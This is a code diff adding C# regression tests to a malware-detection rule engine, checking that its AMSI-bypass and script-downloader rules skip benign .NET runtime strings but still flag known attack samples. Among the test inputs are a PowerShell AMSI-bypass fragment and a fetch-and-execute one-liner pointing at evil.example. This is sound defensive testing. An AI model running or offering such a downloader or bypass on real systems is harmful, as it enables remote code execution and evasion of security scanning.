@@ -66,6 +66,65 @@ public class ShippedRulesTests
     }
 
     [Fact]
+    public void AmsiRule_DoesNotFalsePositive_OnLegitimateDotNetRuntimeAmsiIntegration()
+    {
+        // Regression test for a real false positive found scanning OpenSecurity's own
+        // published self-contained exe: the .NET runtime's own built-in AMSI integration
+        // (bundled into every self-contained single-file .NET app) legitimately calls the
+        // native AmsiScanBuffer API, which used to be the rule's only indicator.
+        var rulesDir = FindRulesDirectory();
+        var rules = PatternRuleParser.ParseDirectory(rulesDir!);
+        var engine = new PatternRuleEngine(rules);
+
+        var content = Encoding.ASCII.GetBytes("...AmsiScanBuffer...some .NET runtime hosting metadata...");
+        var findings = engine.Scan(content).ToList();
+
+        Assert.DoesNotContain(findings, f => f.Name == "Suspicious_Amsi_Bypass_Reference");
+    }
+
+    [Fact]
+    public void AmsiRule_StillMatches_KnownPowerShellBypassTechnique()
+    {
+        var rulesDir = FindRulesDirectory();
+        var rules = PatternRuleParser.ParseDirectory(rulesDir!);
+        var engine = new PatternRuleEngine(rules);
+
+        var content = Encoding.ASCII.GetBytes("[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')");
+        var findings = engine.Scan(content).ToList();
+
+        Assert.Contains(findings, f => f.Name == "Suspicious_Amsi_Bypass_Reference");
+    }
+
+    [Fact]
+    public void ScriptDownloaderRule_DoesNotFalsePositive_OnBareNamespaceFragment()
+    {
+        // Regression test for the same self-scan false positive - "Net.WebClient" is a
+        // substring of a real .NET namespace that can appear in compiled metadata even when
+        // WebClient is never actually invoked as a downloader.
+        var rulesDir = FindRulesDirectory();
+        var rules = PatternRuleParser.ParseDirectory(rulesDir!);
+        var engine = new PatternRuleEngine(rules);
+
+        var content = Encoding.ASCII.GetBytes("System.Net.WebClient, Version=4.0.0.0, referenced in assembly metadata");
+        var findings = engine.Scan(content).ToList();
+
+        Assert.DoesNotContain(findings, f => f.Name == "Suspicious_Script_Downloader");
+    }
+
+    [Fact]
+    public void ScriptDownloaderRule_StillMatches_KnownPowerShellDownloaderOneLiner()
+    {
+        var rulesDir = FindRulesDirectory();
+        var rules = PatternRuleParser.ParseDirectory(rulesDir!);
+        var engine = new PatternRuleEngine(rules);
+
+        var content = Encoding.ASCII.GetBytes("IEX (New-Object Net.WebClient).DownloadString('http://evil.example/payload.ps1')");
+        var findings = engine.Scan(content).ToList();
+
+        Assert.Contains(findings, f => f.Name == "Suspicious_Script_Downloader");
+    }
+
+    [Fact]
     public void EicarRule_StillPresent_AndMatches()
     {
         var rulesDir = FindRulesDirectory();
